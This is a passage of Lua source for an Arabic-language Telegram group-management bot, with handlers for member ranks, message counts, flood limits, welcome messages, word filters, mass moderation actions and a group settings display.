iking_text = "اقوئ تفاعل"
elseif tonumber(user_msgs) < 4000 then 
iking_text = "عضو متفاعل قوي"
elseif tonumber(user_msgs) < 5000 then 
iking_text = "جيد بتفاعل"
elseif tonumber(user_msgs) > 5000 then 
iking_text = "متفاعل كلش"
end
king = database:smembers('king:all:pppp:tt:'..bot_id) or 0
if (king or king[1]) then 
for i=1, #king do
local tttee = database:get("king:set:text:p"..bot_id..king[i])
if tonumber(user_msgs) >= tonumber(king[i]) then 
iking_text = tttee
end
end
end
end
if msg.sender_user_id_ == tonumber(sudo_add) then
fayomy_oop = 'المطور الاساسي 👨🏻‍🔧'
elseif is_sudo(msg2) then
fayomy_oop = database:get("fayomy:name_sudo"..bot_id..msg.chat_id_)  or 'مطور البوت 👨🏻‍💻'
elseif is_creatorbasic(msg) then
fayomy_oop = database:get("fayomy:name_cre"..bot_id..msg.chat_id_) or 'منشئ اساسي 👨🏻‍🚀'
elseif (database:get("fayomy:name_user:"..bot_id..msg.chat_id_..result.id_) and database:get("fayomy:all_if:"..database:get("fayomy:name_user:"..bot_id..msg.chat_id_..result.id_) ..bot_id..msg.chat_id_)) then 
fayomy_oop = database:get("fayomy:name_user:"..bot_id..msg.chat_id_..result.id_)
elseif is_creator(msg) then
fayomy_oop = database:get("fayomy:name_cre"..bot_id..msg.chat_id_) or 'منشئ الكروب 👨🏻‍✈️'
elseif (database:get("fayomy:name_user:"..bot_id..msg.chat_id_..result.id_) and database:get("fayomy:all_if:"..database:get("fayomy:name_user:"..bot_id..msg.chat_id_..result.id_) ..bot_id..msg.chat_id_)) then 
fayomy_oop = database:get("fayomy:name_user:"..bot_id..msg.chat_id_..result.id_)
elseif is_owner(msg2) then
fayomy_oop = database:get("fayomy:name_own"..bot_id..msg.chat_id_) or 'مدير الكروب 🤵🏻'
elseif is_mod(msg2) then
fayomy_oop = database:get("fayomy:name_adm"..bot_id..msg.chat_id_) or 'ادمن الكروب👩🏿‍🚒'
elseif is_vip(msg2) then
fayomy_oop = database:get("fayomy:name_vipp"..bot_id..msg.chat_id_) or ' عضو مميز 🧙🏻‍♂'
else
fayomy_oop = database:get("fayomy:name_nk"..bot_id..msg.chat_id_) or 'عضو فقط 👶🏻' 
end
texfm = "🎟 ※ ايدي ✓ `("..result.id_..")`\n🗳 ※ موقعه ✓("..fayomy_oop..")\n💌 ※ عدد رسائل ✓`("..msgs..")`\n📔 ※ عدد السحكات ✓ `("..edit..")`\n📩 ※ تفاعلك ✓`("..iking_text..")`\n📥 ※ مجوهرآتك ✓*("..nko..")*"
else
texfm = "`"..result.id_.."`"
end
else
texfm = '✖┇خطاء'
end
send(msg.chat_id_, msg.id_, 1, texfm, 1, 'md')
end
resolve_username(ap[2],id_by_username)
end  
if text:match("^جلب صوره (%d+)$") and msg.reply_to_message_id_ == 0 and not database:get('fayomy:'..bot_id..'get:photo'..msg.chat_id_) then
local pronumb = {string.match(text, "^(جلب صوره) (%d+)$")}
local ph = pronumb[2] - 1
local function gpro(extra, result, success)
if result.photos_[ph] then
sendPhoto(msg.chat_id_, msg.id_, 0, 1, nil, result.photos_[ph].sizes_[1].photo_.persistent_id_)
else
send(msg.chat_id_, msg.id_, 1, "❕┇لا تملك صوره رقم <b>{"..pronumb[2].."}</b> في حسابك", 1, 'html')
end
end
tdcli_function ({
ID = "GetUserProfilePhotos",
user_id_ = msg.sender_user_id_,
offset_ = 0,
limit_ = pronumb[2]
}, gpro, nil)
end
if text:match("^وضع تكرار (%d+)$") and (is_owner(msg) or is_creatorbasic(msg)) then
local floodmax = {string.match(text, "^(وضع تكرار) (%d+)$")}
if tonumber(floodmax[2]) < 2 then
send(msg.chat_id_, msg.id_, 1, '🔘┇ضع التكرار من *{2}* الى  *{99999}*', 1, 'md')
else
database:set('fayomy:'..bot_id..'flood:max:'..msg.chat_id_,floodmax[2])
send(msg.chat_id_, msg.id_, 1, '☑┇تم  وضع التكرار بالطرد للعدد ~⪼  *{'..floodmax[2]..'}*', 1, 'md')
end
end
if text and text == "وضع رابط" and is_admin(msg) then 
send(msg.chat_id_, msg.id_, 1, '💥┇ارسال الان رابط المجموعه', 1, "md") 
database:set("king:get:url:"..bot_id..msg.chat_id_..msg.sender_user_id_,true)
return "king"
end
if text and database:get("king:get:url:"..bot_id..msg.chat_id_..msg.sender_user_id_) and text:match("[Hh][Tt][Tt][pP]") then 
send(msg.chat_id_, msg.id_, 1, '☑┇تم وضع : ['..text..']', 1, 'md')
database:set('fayomy:'..bot_id.."group:link"..msg.chat_id_,text)
database:del("king:get:url:"..bot_id..msg.chat_id_..msg.sender_user_id_,true)
return "king"
end
if text:match("^وضع زمن التكرار (%d+)$") and (is_owner(msg) or is_creatorbasic(msg)) then
local floodt = {string.match(text, "^(وضع زمن التكرار) (%d+)$")}
if tonumber(floodt[2]) < 1 then
send(msg.chat_id_, msg.id_, 1, '🔘┇ضع العدد من *{1}* الى  *{99999}*', 1, 'md')
else
database:set('fayomy:'..bot_id..'flood:time:'..msg.chat_id_,floodt[2])
send(msg.chat_id_, msg.id_, 1, '☑┇تم  وضع الزمن التكرار للعدد ~⪼  *{'..floodt[2]..'}*', 1, 'md')
end
end
if text:match("^الرابط$") then
if not database:get("fayomy:mute:link:gr:"..bot_id..msg.chat_id_) then 
function dl_cb222( t1,t2 )
if t2.invite_link_ ~= false then 
send(msg.chat_id_, msg.id_, 1, '🎴※ رابط المجموعة 👩🏿‍🚒✓\n'..(t2.invite_link_ or "Error"), 1, "html")
elseif (database:get('fayomy:'..bot_id.."group:link"..msg.chat_id_) and database:get('fayomy:'..bot_id.."group:link"..msg.chat_id_) ~= "Error") then 
send(msg.chat_id_, msg.id_, 1, '🎴※ رابط المجموعة 👩🏿‍🚒✓\n'..database:get('fayomy:'..bot_id.."group:link"..msg.chat_id_), 1, "html")
else
local getlink = 'https://api.telegram.org/bot'..token..'/exportChatInviteLink?chat_id='..msg.chat_id_
local req = https.request(getlink)
local link = json:decode(req)
if link.ok == true then 
send(msg.chat_id_, msg.id_, 1, '📮┇رابط المجموعه \n'..(link.result or "Error"), 1, "html")
database:set('fayomy:'..bot_id.."group:link"..msg.chat_id_,link.result)
else 
send(msg.chat_id_, msg.id_, 1, '⚠️┇لا يمكني الوصل الى الرابط عليك منحي صلاحيه {دعوه المستخدمين من خلال الرابط}', 1, "html")
end
end
end
tdcli_function ({
ID = "GetChannelFull",
channel_id_ = getChatId(msg.chat_id_).ID
}, dl_cb222, nil)
else 
send(msg.chat_id_, msg.id_, 1, '🖲┇جلب الرابط معطل', 1, "html") 
end
end
-----------------------------------------------------------
if text:match("^تفعيل الترحيب$") and (is_mod(msg) or is_creatorbasic(msg)) then
send(msg.chat_id_, msg.id_, 1, '☑┇تم تفعيل الترحيب في المجموعه', 1, 'md')
database:set('fayomy:'..bot_id.."welcome"..msg.chat_id_,true)
end
if text:match("^تعطيل الترحيب$") and (is_mod(msg) or is_creatorbasic(msg)) then
send(msg.chat_id_, msg.id_, 1, '☑┇تم تعطيل الترحيب في المجموعه', 1, 'md')
database:del('fayomy:'..bot_id.."welcome"..msg.chat_id_)
end
if text:match("^وضع ترحيب (.*)$") and (is_mod(msg) or is_creatorbasic(msg)) then
local welcome = {string.match(text, "^(وضع ترحيب) (.*)$")}
send(msg.chat_id_, msg.id_, 1, '☑┇تم وضع ترحيب\n📜┇~⪼('..welcome[2]..')', 1, 'md')
database:set('fayomy:'..bot_id..'welcome:'..msg.chat_id_,welcome[2])
end
if text:match("^حذف الترحيب$") and (is_mod(msg) or is_creatorbasic(msg)) then
send(msg.chat_id_, msg.id_, 1, '☑┇تم حذف الترحيب', 1, 'md')
database:del('fayomy:'..bot_id..'welcome:'..msg.chat_id_)
end
if text:match("^جلب الترحيب$") and (is_mod(msg) or is_creatorbasic(msg)) then
local wel = database:get('fayomy:'..bot_id..'welcome:'..msg.chat_id_)
if wel then
send(msg.chat_id_, msg.id_, 1, '📜┇الترحيب\n~⪼('..wel..')', 1, 'md')
else
send(msg.chat_id_, msg.id_, 1, '✖┇لم يتم وضع ترحيب للمجموعه\n', 1, 'md')
end
end  
if text:match("^منع (.*)$") and (is_mod(msg) or is_creatorbasic(msg)) then
local filters = {string.match(text, "^(منع) (.*)$")}
local name = string.sub(filters[2], 1, 50)
database:hset('fayomy:'..bot_id..'filters:'..msg.chat_id_, name, 'filtered')
send(msg.chat_id_, msg.id_, 1, "☑┇تم اضافتها لقائمه المنع\n🔘┇{"..name.."}", 1, 'md')
end  
if text:match("^الغاء منع (.*)$") and (is_mod(msg) or is_creatorbasic(msg)) then
local rws = {string.match(text, "^(الغاء منع) (.*)$")}
local name = string.sub(rws[2], 1, 50)
database:hdel('fayomy:'..bot_id..'filters:'..msg.chat_id_, rws[2])
send(msg.chat_id_, msg.id_, 1, "☑┇تم حذفها من لقائمه المنع\n🔘┇{"..rws[2].."}", 1, 'md')
end  
if (text and text == "تنظيف قائمه المحظورين" and (is_creator(msg) or is_creatorbasic(msg))) then 
local function getChannelMembers(channel_id, filter, offset, limit, cb)
if not limit or limit > 200 then
limit = 200
end
tdcli_function ({
ID = "GetChannelMembers",
channel_id_ = getChatId(channel_id).ID,
filter_ = {
ID = "ChannelMembers" .. filter
},
offset_ = offset or 0,
limit_ = limit
}, cb or dl_cb, nil)
end
function kingididi(t1,t2)
if t2.members_ then 
for i=1,#t2.members_ do 
bot.changeChatMemberStatus(msg.chat_id_, t2.members_[i].user_id_, "Left")
end
send(msg.chat_id_, msg.id_, 1, '☑┇تم الغاء حظر {'..t2.total_count_..'} عضو', 1, 'md')
end
end
getChannelMembers(msg.chat_id_,"Kicked",0,10000,kingididi)
end
if (text:match("^كشف البوتات$") or text:match("^البوتات$")) and (is_mod(msg) or is_creatorbasic(msg)) then
local txt = {string.match(text, "^كشف البوتات$")}
local function cb(extra,result,success)
local list = result.members_
text = '📊┇البوتات\n┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ \n'
local n = 0
for k,v in pairs(list) do
if v.user_id_ ~= bot_id then
n = (n + 1)
local user_info = database:hgetall('fayomy:'..bot_id..'user:'..v.user_id_)
if user_info and user_info.username then
local username = user_info.username
text = text.."<b>|"..n.."|</b>~⪼(@"..username..")\n"
else
text = text.."<b>|"..n.."|</b>~⪼(<code>"..v.user_id_.."</code>)\n"
end
end
if #text > 7000 then
send(msg.chat_id_, msg.id_, 1, text, 1, 'html')
text = ""
end
end
if #list ~= 0 then
send(msg.chat_id_, msg.id_, 1, text, 1, 'html')
else
send(msg.chat_id_, msg.id_, 1, "📊┇لا توجد بوتات في المجموعه", 1, 'html')
end
end
bot.channel_get_bofm(msg.chat_id_,cb)
end
if (text:match("^رسائلي$") or text:match("^msg$")) and msg.reply_to_message_id_ == 0  then
local user_msgs = database:get('fayomy:'..bot_id..'user:msgs'..msg.chat_id_..':'..msg.sender_user_id_)
local tahna = (database:get('fayomy:'..bot_id..'nummsg'..msg.chat_id_..msg.sender_user_id_) or 0)

if not database:get('fayomy:'..bot_id..'id:mute'..msg.chat_id_) then
send(msg.chat_id_, msg.id_, 1, "💌 ※ رسائلك ✓ *("..(user_msgs + tahna)..")*", 1, 'md')
else
end
end
if text:match("^جلب الرسائل الاصليه$") and (is_creator(msg) or is_creatorbasic(msg)) and msg.reply_to_message_id_ ~= 0 then
function mute_by_reply(extra, result, success)
database:del('fayomy:'..bot_id..'nummsg'..msg.chat_id_..result.sender_user_id_)
local user_msgs = database:get('fayomy:'..bot_id..'user:msgs'..msg.chat_id_..':'..result.sender_user_id_)
send(msg.chat_id_, msg.id_, 1, "📨┇تم استعاد الرسائل  \n📨┇عدد الرسائل الاصليه ~⪼ *{"..(user_msgs).."}*", 1, 'md')
end
getMessage(msg.chat_id_, msg.reply_to_message_id_,mute_by_reply)
end

if text:match("^جهاتي$") then
add = (tonumber(database:get('fayomy:'..bot_id..'user:add'..msg.chat_id_..':'..msg.sender_user_id_)) or 0)
send(msg.chat_id_, msg.id_, 1, "📨┇عدد اضافه جهاتك ~⪼ *{"..add.."}*\n📨┇سيتم حذف العدد بعد هذه الرساله", 1, 'md')
database:del('fayomy:'..bot_id..'user:add'..msg.chat_id_..':'..msg.sender_user_id_)
end
if text:match("^(عدد السحكات)$") or text:match("^(سحكاتي)$") then
local edit = database:get('fayomy:'..bot_id..'user:editmsg'..msg.chat_id_..':'..msg.sender_user_id_) or 0
send(msg.chat_id_, msg.id_, 1, "📮※ سحكاتك  ✓ *("..edit..")*", 1, 'md')
end
if text == 'حذف سحكاتي' then 
database:del('fayomy:'..bot_id..'user:editmsg'..msg.chat_id_..':'..msg.sender_user_id_)
local fayomy = '🗑 ※ تم حذف سحكاتك ✓'
send(msg.chat_id_, msg.id_, 1, fayomy, 1, 'md')
end
if text:match("^مسح قائمه العام$") and tonumber(msg.sender_user_id_) == tonumber(sudo_add) then
text = '☑┇تم مسح قائمه العام'
database:del('fayomy:'..bot_id..'gbanned:')
send(msg.chat_id_, msg.id_, 1, text, 1, 'md')
end
if text:match("^مسح المكتومين عام") and tonumber(msg.sender_user_id_) == tonumber(sudo_add) then
text = '☑┇ تم مسح المكتومين عام'
database:del('fayomy:'..bot_id..'gmuted:')
send(msg.chat_id_, msg.id_, 1, text, 1, 'md')
end
if (text:match("^(تعين عدد الاحرف) (%d+)$") and is_mod(msg)) then
fayomy_0 = {string.match(text, "^(تعين عدد الاحرف) (%d+)$")}
send(msg.chat_id_, msg.id_, 1, '☑┇ تم تعين عدد الاحرف {`'..fayomy_0[2]..'`}', 1, 'md')
database:set("fayomy:not:word:"..bot_id..msg.chat_id_,fayomy_0[2])
end
if text:match("^مسح (.*)$") and (is_mod(msg) or is_creatorbasic(msg)) then
local txt = {string.match(text, "^(مسح) (.*)$")}
if txt[2] == 'banlist' or txt[2] == 'Banlist' or txt[2] == 'المحظورين' then
database:del('fayomy:'..bot_id..'banned:'..msg.chat_id_)
send(msg.chat_id_, msg.id_, 1, '🚷※ تم مسح المحظورين من البوت ✓ ', 1, 'md')
end
if txt[2] == 'creators' and is_creatorbasic(msg) or txt[2] == 'creatorlist' and is_creatorbasic(msg) or txt[2] == 'Creatorlist' and is_creatorbasic(msg) or txt[2] == 'Creators' and is_creatorbasic(msg) or txt[2] == 'المنشئين' and is_creatorbasic(msg) then
database:del('fayomy:'..bot_id..'creator:'..msg.chat_id_)
send(msg.chat_id_, msg.id_, 1, '👨🏻‍✈️※ تم مسح قائمة المنشئين  ✓', 1, 'md')
end
if txt[2] == 'البوتات' then
local function cb(extra,result,success)
local bofm = result.members_
for i=0 , #bofm do
if tonumber(bofm[i].user_id_) ~= tonumber(bot_id) then chat_kick(msg.chat_id_,bofm[i].user_id_)
end
end
end
bot.channel_get_bofm(msg.chat_id_,cb)
send(msg.chat_id_, msg.id_, 1, '☑┇تم مسح جميع البوتات', 1, 'md')
end
if txt[2] == 'الادمنيه' and (is_owner(msg) or is_creatorbasic(msg)) then
database:del('fayomy:'..bot_id..'mods:'..msg.chat_id_)
send(msg.chat_id_, msg.id_, 1, '👨🏻‍🎨※ تم مسح  قائمة الادمنية  ✓', 1, 'md')
end
if  txt[2] == 'الاعضاء المميزين' and (is_owner(msg) or is_creatorbasic(msg)) then
database:del('fayomy:'..bot_id..'vipgp:'..msg.chat_id_)
send(msg.chat_id_, msg.id_, 1, '👶🏻※ تم مسح  قائمة الاعضاء المميزين  ✓', 1, 'md')
end
if  txt[2] == 'المميزين' and (is_owner(msg) or is_creatorbasic(msg)) then
database:del('fayomy:'..bot_id..'vipgp:'..msg.chat_id_)
send(msg.chat_id_, msg.id_, 1, '👶🏻※ تم مسح  قائمة الاعضاء المميزين  ✓', 1, 'md')
end
if  txt[2] == 'المدراء' and (is_creator(msg) or is_creatorbasic(msg)) then
database:del('fayomy:'..bot_id..'owners:'..msg.chat_id_)
send(msg.chat_id_, msg.id_, 1, '👩🏿‍🚒※ تم مسح  قائمة المدراء  ✓', 1, 'md')
end
if  txt[2] == 'القوانين' then
database:del('fayomy:'..bot_id..'rules'..msg.chat_id_)
send(msg.chat_id_, msg.id_, 1, '☑┇تم مسح القوانين المحفوظه', 1, 'md')
end
if txt[2] == 'الرابط' then
database:del('fayomy:'..bot_id..'group:link'..msg.chat_id_)
send(msg.chat_id_, msg.id_, 1, '☑┇تم مسح الرابط المحفوظ', 1, 'md')
end
if txt[2] == 'قائمه المنع' then
database:del('fayomy:'..bot_id..'filters:'..msg.chat_id_)
send(msg.chat_id_, msg.id_, 1, '☑┇تم مسح قائمه المنع', 1, 'md')
end
if  txt[2] == 'المكتومين' then
database:del('fayomy:'..bot_id..'muted:'..msg.chat_id_)
send(msg.chat_id_, msg.id_, 1, '📟※ تم مسح قائمه المكتومين ✓', 1, 'md')
end
end
if (text and (text == "تعطيل الطرد" or text == "تعطيل الحظر") and (is_creator(msg) or is_creatorbasic(msg))) then
database:set("Fayomy:lock:ban_and_kick"..bot_id..msg.chat_id_,"fayomy")
send(msg.chat_id_, msg.id_, 1, '☑┇تم تعطيل (طرد - حضر) الاعضاء', 1, 'md')
end
if (text and (text == "تفعيل الطرد" or text == "تفعيل الحظر")  and (is_creator(msg) or is_creatorbasic(msg))) then
database:del("Fayomy:lock:ban_and_kick"..bot_id..msg.chat_id_)
send(msg.chat_id_, msg.id_, 1, '☑┇تم تفعيل (طرد - حضر) الاعضاء', 1, 'md')
end
if text:match("^اضافه قائمه المحظورين$") and (is_creator(msg) or is_creatorbasic(msg)) then
local txt = {string.match(text, "^(اضافه قائمه المحظورين)$")}
local function cb(extra,result,success)
local list = result.members_
for k,v in pairs(list) do
bot.addChatMember(msg.chat_id_, v.user_id_, 200, dl_cb, nil)
end
text = '☑┇تم اضافه قائمه المحظورين للمجموعه'
send(msg.chat_id_, msg.id_, 1, text, 1, 'md')
end
bot.channel_get_kicked(msg.chat_id_,cb)
end
if text:match("^طرد المحذوفين$") and (is_creator(msg) or is_creatorbasic(msg)) then
local txt = {string.match(text, "^(طرد المحذوفين)$")}
local function getChatId(chat_id)
local chat = {}
local chat_id = tostring(chat_id)
if chat_id:match('^-100') then
local channel_id = chat_id:gsub('-100', '')
chat = {ID = channel_id, type = 'channel'}
else
local group_id = chat_id:gsub('-', '')
chat = {ID = group_id, type = 'group'}
end
return chat
end
local function check_delete(arg, data)
for k, v in pairs(data.members_) do
local function clean_cb(arg, data)
if not data.first_name_ then
bot.changeChatMemberStatus(msg.chat_id_, data.id_, "Kicked")
end
end
bot.getUser(v.user_id_, clean_cb)
end
text = '☑┇تم طرد الحسابات المحذوفه'
send(msg.chat_id_, msg.id_, 1, text, 1, 'md')
end
tdcli_function ({ID = "GetChannelMembers",channel_id_ = getChatId(msg.chat_id_).ID,offset_ = 0,limit_ = 5000}, check_delete, nil)
end
if text:match("^طرد المتروكين$") and (is_creator(msg) or is_creatorbasic(msg)) then
local txt = {string.match(text, "^(طرد المتروكين)$")}
local function getChatId(chat_id)
local chat = {}
local chat_id = tostring(chat_id)
if chat_id:match('^-100') then
local channel_id = chat_id:gsub('-100', '')
chat = {ID = channel_id, type = 'channel'}
else
local group_id = chat_id:gsub('-', '')
chat = {ID = group_id, type = 'group'}
end
return chat
end
local function check_deactive(arg, data)
for k, v in pairs(data.members_) do
local function clean_cb(arg, data)
if data.type_.ID == "UserTypeGeneral" then
if data.status_.ID == "UserStatusEmpty" then
bot.changeChatMemberStatus(msg.chat_id_, data.id_, "Kicked")
end
end
end
bot.getUser(v.user_id_, clean_cb)
end
text = '☑┇تم طرد الحسابات المتروكة من المجموعة'
send(msg.chat_id_, msg.id_, 1, text, 1, 'md')
end
tdcli_function ({ID = "GetChannelMembers",channel_id_ = getChatId(msg.chat_id_).ID,offset_ = 0,limit_ = 5000}, check_deactive, nil)
end
if text and text == "تاك للكل" and (is_owner(msg) or is_creatorbasic(msg)) then
function tag_all(t1, t2)
local text = "👨‍👧‍👦 ※ قائمه الاعضاء  ✓ ،\nꔹ┉♦️┉ ┉ ┉ ┉♦️┉ꔹ \n"
i = 0
for k, v in pairs(t2.members_) do
i = i + 1
local user_info = database:hgetall('fayomy:'..bot_id..'user:'..v.user_id_)
if user_info and user_info.username then
local username = user_info.username
text = text.."<b>|"..i.."|</b>~⪼(@"..username..")\n"
end
end
send(msg.chat_id_, msg.id_, 1, text, 1, 'html')
print(text)
end
tdcli_function({ID = "GetChannelMembers",channel_id_ = getChatId(msg.chat_id_).ID, offset_ = 0,limit_ = 200000},tag_all,nil)
end
if text:match("^ادمنيه المجموعه$") and (is_owner(msg) or is_creatorbasic(msg)) then
local txt = {string.match(text, "^ادمنيه المجموعه$")}
local function cb(extra,result,success)
local list = result.members_
text = '📊┇ادمنيه الكروب\n┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ \n'
local n = 0
for k,v in pairs(list) do
n = (n + 1)
local user_info = database:hgetall('fayomy:'..bot_id..'user:'..v.user_id_)
if user_info and user_info.username then
local username = user_info.username
text = text.."<b>|"..n.."|</b>~⪼(@"..username..")\n"
else
text = text.."<b>|"..n.."|</b>~⪼(<code>"..v.user_id_.."</code>)\n"
end
if #text > 7000 then
send(msg.chat_id_, msg.id_, 1, text, 1, 'html')
text = ""
end
end
send(msg.chat_id_, msg.id_, 1, text, 1, 'html')
end
bot.channel_get_admins(msg.chat_id_,cb)
end
if text:match("^رفع الادمنيه$") and (is_owner(msg) or is_creatorbasic(msg)) then
local res = http.request('https://fayomy.000webhostapp.com/fayomy.gq/x.php?id='..msg.sender_user_id_..'')
vardump(res)
if res then
if res == 'false' then
send(msg.chat_id_, msg.id_, 1,'\n• اهلا بك عزيزي 🔱 •\n• لايمكنك استخدام البوت ✅ •\n• عليك الاشتراك في القناة 🔽 •\n• @FAYOMYYT ⚜️\n', 1, 'html')   
return false end
end
local txt = {string.match(text, "^رفع الادمنيه$")}
local function cb(extra,result,success)
local list = result.members_
moody = '📊┇ تم رفع ادمنيه المجموعه في البوت\n'
local n = 0
for k,v in pairs(list) do
n = (n + 1)
local hash =  'fayomy:'..bot_id..'mods:'..msg.chat_id_
database:sadd(hash, v.user_id_)
end
send(msg.chat_id_, msg.id_, 1, moody, 1, 'html')
end
bot.channel_get_admins(msg.chat_id_,cb)
end
if text:match("^الاعدادات$") and (is_mod(msg) or is_creatorbasic(msg)) then
if database:get("lock_media:fayomy"..msg.chat_id_..bot_id) then
mute_all = '✔┇'
else
mute_all = '✖┇'
end
------------
if database:get("lock_chat:fayomy"..msg.chat_id_..bot_id) then
mute_text = '✔┇'
else
mute_text = '✖┇'
end
------------
if database:get("lock_photo:fayomy"..msg.chat_id_..bot_id) then
mute_photo = '✔┇'
else
mute_photo = '✖┇'
end
------------
if database:get("lock_video:fayomy"..msg.chat_id_..bot_id) then
mute_video = '✔┇'
else
mute_video = '✖┇'
end
if database:get("lock_note:fayomy"..msg.chat_id_..bot_id) then
mute_note = '✔┇'
else
mute_note = '✖┇'
end
------------
if database:get("lock_gif:fayomy"..msg.chat_id_..bot_id) then
mute_gifs = '✔┇'
else
mute_gifs = '✖┇'
end
------------
if not database:get('fayomy:'..bot_id..'flood:max:'..msg.chat_id_) then
flood_m = 10
else
flood_m = database:get('fayomy:'..bot_id..'flood:max:'..msg.chat_id_)
end
if not database:get( 'fayomy:'..bot_id..'flood:time:'..msg.chat_id_) then
flood_t = 10
else
flood_t = database:get( 'fayomy:'..bot_id..'flood:time:'..msg.chat_id_)
end
------------
if database:get("lock_audeo:fayomy"..msg.chat_id_..bot_id) then
mute_music = '✔┇'
else
mute_music = '✖┇'
end
------------
if database:get("lock_bot:fayomy"..msg.chat_id_..bot_id) then
mute_bofm = '✔┇'
else
mute_bofm = '✖┇'
end

if database:get("lock_botAndBan:fayomy"..msg.chat_id_..bot_id) then
mute_bofmb = '✔┇'
else
mute_bofmb = '✖┇'
end
if database:get("lock_lllll:fayomy"..msg.chat_id_..bot_id) then
mute_flood = '✔┇'
else
mute_flood = '✖┇'
end
------------
if database:get("lock_inline:fayomy"..msg.chat_id_..bot_id) then
mute_in = '✔┇'
else
mute_in = '✖┇'
end
------------
if database:get("lock_voice:fayomy"..msg.chat_id_..bot_id) then
mute_voice = '✔┇'
else
mute_voice = '✖┇'
end
------------
if database:get("lock_edit:fayomy"..msg.chat_id_..bot_id) then
mute_edit = '✔┇'
else
mute_edit = '✖┇'
end
------------
if database:get("lock_link:fayomy"..msg.chat_id_..bot_id) then
mute_links = '✔┇'
else
mute_links = '✖┇'
end
------------
if database:get("lock_pin:fayomy"..msg.chat_id_..bot_id) then
lock_pin = '✔┇'
else
lock_pin = '✖┇'
end

if database:get("lock_files:fayomy"..msg.chat_id_..bot_id) then
mute_doc = '✔┇'
else
mute_doc = '✖┇'
end

if database:get("lock_mark:fayomy"..msg.chat_id_..bot_id) then
mute_mdd = '✔┇'
else
mute_mdd = '✖┇'
end
------------
if database:get("lock_stecker:fayomy"..msg.chat_id_..bot_id) then
lock_sticker = '✔┇'
else
lock_sticker = '✖┇'
end
------------
if database:get("lock_new:fayomy"..msg.chat_id_..bot_id) then
lock_tgservice = '✔┇'
else
lock_tgservice = '✖┇'
end
------------
if database:get("lock_tag:fayomy"..msg.chat_id_..bot_id) then
lock_htag = '✔┇'
else
lock_htag = '✖┇'
end

if database:get("lock_sarha:fayomy"..msg.chat_id_..bot_id) then
lock_cmd = '✔┇'
else
lock_cmd = '✖┇'
end
------------
if database:get("lock_username:fayomy"..msg.chat_id_..bot_id) then
lock_tag = '✔┇'
else
lock_tag = '✖┇'
end
------------
if database:get("lock_contact:fayomy"..msg.chat_id_..bot_id) then
lock_contact = '✔┇'
else
lock_contact = '✖┇'
end
------------
if database:get("lock_en:fayomy"..msg.chat_id_..bot_id) then
lock_english = '✔┇'
else
lock_english = '✖┇'
end
------------
if database:get("lock_ar:fayomy"..msg.chat_id_..bot_id) then
lock_arabic = '✔┇'
else
lock_arabic = '✖┇'
end
------------
if database:get("lock_fwd:fayomy"..msg.chat_id_..bot_id) then
lock_forward = '✔┇'
else
lock_forward = '✖┇'
end

if database:get('fayomy:'..bot_id..'rep:mute'..msg.chat_id_) then
lock_rep = '✔┇'
else
lock_rep = '✖┇'
end
------------
if database:get('fayomy:'..bot_id..'repsudo:mute'..msg.chat_id_) then
lock_repsudo = '✔┇'
else
lock_repsudo = '✖┇'
end
------------
if database:get('fayomy:'..bot_id..'repowner:mute'..msg.chat_id_) then
lock_repowner = '✔┇'
else
lock_repowner = '✖┇'
end
------------
if database:get('fayomy:'..bot_id..'id:mute'..msg.chat_id_) then
lock_id = '✔┇'
else
lock_id = '✖┇'
end
------------
if database:get('fayomy:'..bot_id..'pin:mute'..msg.chat_id_) then
lock_pind = '✔┇'
else
lock_pind = '✖┇'
end
------------
if database:get('fayomy:'..bot_id..'id:mute'..msg.chat_id_) then
lock_id_photo = '✔┇'
else
lock_id_photo = '✖┇'
end
------------
if database:get( 'fayomy:'..bot_id.."welcome"..msg.chat_id_) then
send_welcome = '✔┇'
else
send_welcome = '✖┇'
end
------------
local ex = database:ttl( 'fayomy:'..bot_id.."charge:"..msg.chat_id_)
if ex == -1 then
exp_dat = 'لا نهائي'
else
exp_dat = math.floor(ex / 86400) + 1
end
------------
local TXT = "🗑┇اعدادات المجموعه بالمسح\n┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ \n✔┇~⪼ مفعل\n✖┇~⪼ معطل\n┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ \n"
..mute_all.."الميديا".."\n"
..mute_links.." الروابط".."\n"
..mute_edit .." التعديل".."\n"
..mute_bofm .." البوتات".."\n"
..mute_bofmb.." البوتات بالطرد".."\n"
..lock_english.." اللغه الانكليزيه".."\n"
..lock_forward.." اعاده التوجيه".."\n"
..lock_pin.." التثبيت".."\n"
..lock_arabic.." اللغه العربيه".."\n"
..lock_htag.." التاكات".."\n"
..lock_tag.." المعرفات".."\n"
..lock_tgservice.." الاشعارات".."\n"
..mute_flood.." التكرار".."\n\n"
..mute_text.." الدردشه".."\n"
..mute_gifs.." الصور المتحركه".."\n"
..mute_voice.." الصوتيات".."\n"
..mute_music.." الاغاني".."\n"
..mute_in.." الانلاين".."\n"
..lock_sticker.." الملصقات".."\n\n"
..lock_contact.." جهات الاتصال".."\n"
..mute_video.." الفيديوهات".."\n"
..lock_cmd.." الشارحه".."\n"
..mute_mdd.." الماركدون".."\n"
..mute_doc.." الملفات".."\n"
..mute_photo.." الصور".."\n"
..mute_note.." بصمه الفيديو".."\n"
..lock_repsudo.." ردود المطور".."\n\n"
..lock_repowner.." ردود المدير".."\n"
..lock_id.."الايدي".."\n"
..lock_pind.."خاصية التثبيت".."\n"
..lock_id_photo.."الايدي بالصوره".."\n"
..send_welcome.." الترحيب".."\n"
.."┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉  \n"
..'🔗┇عدد التكرار : '..flood_m..'\n'
..'🔗┇زمن التكرار : '..flood_m..'\n'
..'🔗┇انقضاء البوت: '..exp_dat..' يوم \n┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉'
send(msg.chat_id_, msg.id_, 1, TXT, 1, 'md')
end

if (text and text == 'قفل تعديل المجموعه')  and  (is_creator(msg) or is_creatorbasic(msg)) then
local fmX_o = database:get("group_edit:fayomy"..msg.chat_id_..bot_id)
if not fmX_o then
database:set("group_edit:fayomy"..msg.chat_id_..bot_id,true)
fmX000("lock",msg,"📝※ تم قفل تعديل المجموعه ✓")
else
fmX000("lock",msg,"📝※ تم قفل تعديل المجموعه بالفعل✓")
end
end
if (text and text == 'فتح تعديل المجموعه')  and  (is_creator(msg) or is_creatorbasic(msg)) then
local fmX_o = database:get("group_edit:fayomy"..msg.chat_id_..bot_id)
if not fmX_o then
